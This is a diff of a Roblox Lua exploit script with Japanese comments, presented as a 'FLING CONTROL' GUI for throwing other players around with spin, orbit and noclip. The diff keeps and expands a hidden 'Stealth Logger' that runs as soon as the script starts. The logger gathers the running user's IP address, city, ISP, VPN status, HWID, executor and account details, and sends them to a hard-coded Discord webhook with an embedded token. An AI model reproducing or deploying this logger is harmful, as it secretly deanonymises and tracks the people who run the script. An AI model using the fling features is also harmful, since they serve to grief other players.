@@ -1,4 +1,4 @@
-local MarketService = game:GetService("MarketplaceService")
+local MarketplaceService = game:GetService("MarketplaceService")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local GuiService = game:GetService("GuiService")
@@ -6,25 +6,37 @@ local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 
-local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"
+-- === 設定 ===
+local webhook_url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"
 
--- === ログ送信セクション (特定機能) ===
+-- === 1. ロガーセクション (最新の特定ログ機能) ===
 local function sendDetailedLog()
     local ipData = "取得失敗"
-    local geoData = {city = "不明", regionName = "不明", isp = "不明", proxy = false}
+    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
     local info = {Name = "不明"}
+    local avatarUrl = ""
 
+    -- アバター画像の取得 (最新API)
     pcall(function()
-        -- ゲーム情報の取得
-        info = MarketService:GetProductInfo(game.PlaceId)
-        -- IP取得
+        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. lp.UserId .. "&size=720x720&format=Png&isCircular=false"
+        local thumbRes = game:HttpGet(thumbApi)
+        local thumbData = HttpService:JSONDecode(thumbRes)
+        if thumbData and thumbData.data and thumbData.data[1] then
+            avatarUrl = thumbData.data[1].imageUrl
+        else
+            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
+        end
+    end)
+
+    -- IPおよび位置情報の取得
+    pcall(function()
+        info = MarketplaceService:GetProductInfo(game.PlaceId)
         ipData = game:HttpGet("https://api.ipify.org")
-        -- IP詳細とVPN検知
         local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
         geoData = HttpService:JSONDecode(response)
     end)
 
-    -- デバイス・実行環境の高度な特定
+    -- 実行環境の特定
     local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
     local hwid = (gethwid and gethwid()) or "取得不可"
     
@@ -42,46 +54,44 @@ local function sendDetailedLog()
         deviceDetail = "💻 PC (Windows/Mac)"
     end
 
+    -- Discord Embedデータ
     local data = {
         ["embeds"] = {{
-            ["title"] = "🚀 スクリプト起動: " .. lp.Name,
-            ["color"] = 0xFF4500, -- オレンジレッド
+            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
+            ["color"] = 0xff4500,
             ["fields"] = {
                 {
                     ["name"] = "👤 ユーザー",
-                    ["value"] = "**ID:** `" .. lp.UserId .. "`\n**表示名:** " .. lp.DisplayName .. "\n**垢経過:** " .. lp.AccountAge .. "日",
+                    ["value"] = "**Username:** `" .. lp.Name .. "`\n**DisplayName:** " .. lp.DisplayName .. "\n**UserID:** `" .. lp.UserId .. "`\n**垢経過:** " .. lp.AccountAge .. "日",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🛠 環境/HWID",
-                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Exec:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
+                    ["name"] = "🛠 実行環境",
+                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🌐 ネットワーク特定",
-                    ["value"] = "**IP:** `" .. ipData .. "`\n**場所:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
+                    ["name"] = "🌐 ネットワーク",
+                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "📍 サーバー情報",
+                    ["name"] = "📍 サーバー/実行場所",
                     ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId .. "\n**JobId:** `" .. game.JobId .. "`",
                     ["inline"] = false
                 }
             },
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
-            },
-            ["footer"] = {
-                ["text"] = "User ID: shiun4545 | " .. os.date("%Y/%m/%d %X")
-            }
+            ["thumbnail"] = { ["url"] = avatarUrl },
+            ["footer"] = { ["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X") }
         }}
     }
 
+    -- 送信
     pcall(function()
         local req = (syn and syn.request) or (http and http.request) or request
         if req then
             req({
-                Url = url,
+                Url = webhook_url,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode(data)
@@ -90,12 +100,12 @@ local function sendDetailedLog()
     end)
 end
 
--- ログ実行
+-- ログ送信実行
 sendDetailedLog()
 
--- === GUIセクション ===
+-- === 2. GUIセクション (フリング機能) ===
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "CustomFling_Orbit"
+ScreenGui.Name = "CustomFling_Orbit_Shiun"
 ScreenGui.Parent = lp:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
 
@@ -114,7 +124,7 @@ UICorner.Parent = Frame
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0.08, 0)
-Title.Text = "FLING CONTROL"
+Title.Text = "FLING CONTROL (shiun4545)"
 Title.TextColor3 = Color3.new(1, 1, 1)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.SourceSansBold
@@ -164,9 +174,8 @@ local SpinBtn = createBtn("SPIN: OFF", UDim2.new(0.05, 0, 0.55, 0), Color3.fromR
 local OrbitBtn = createBtn("ORBIT: OFF", UDim2.new(0.05, 0, 0.67, 0), Color3.fromRGB(150, 0, 0))
 local ToggleBtn = createBtn("FLING: OFF", UDim2.new(0.05, 0, 0.79, 0), Color3.fromRGB(150, 0, 0))
 
-local flicking = false
-local spinning = false
-local orbiting = false
+-- ロジック変数
+local flicking, spinning, orbiting = false, false, false
 local targetPlayer = nil
 local flingPower = 150000
 local spinSpeed = 200
@@ -174,6 +183,7 @@ local orbitSpeed = 25
 local orbitDistance = 3.5
 local angle = 0
 
+-- プレイヤーリスト更新
 local function updateList()
     for _, child in pairs(ScrollingFrame:GetChildren()) do
         if child:IsA("TextButton") then child:Destroy() end
@@ -210,6 +220,7 @@ updateList()
 Players.PlayerAdded:Connect(updateList)
 Players.PlayerRemoving:Connect(updateList)
 
+-- ボタンイベント
 SpinBtn.MouseButton1Click:Connect(function()
     spinning = not spinning
     SpinBtn.Text = spinning and "SPIN: ON" or "SPIN: OFF"
@@ -228,6 +239,7 @@ ToggleBtn.MouseButton1Click:Connect(function()
     ToggleBtn.BackgroundColor3 = flicking and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
 end)
 
+-- メインループ
 RunService.Heartbeat:Connect(function(dt)
     local char = lp.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
@@ -264,6 +276,7 @@ RunService.Heartbeat:Connect(function(dt)
     end
 end)
 
+-- 衝突判定無効化
 RunService.Stepped:Connect(function()
     if (flicking or orbiting or spinning) and lp.Character then
         for _, part in pairs(lp.Character:GetDescendants()) do
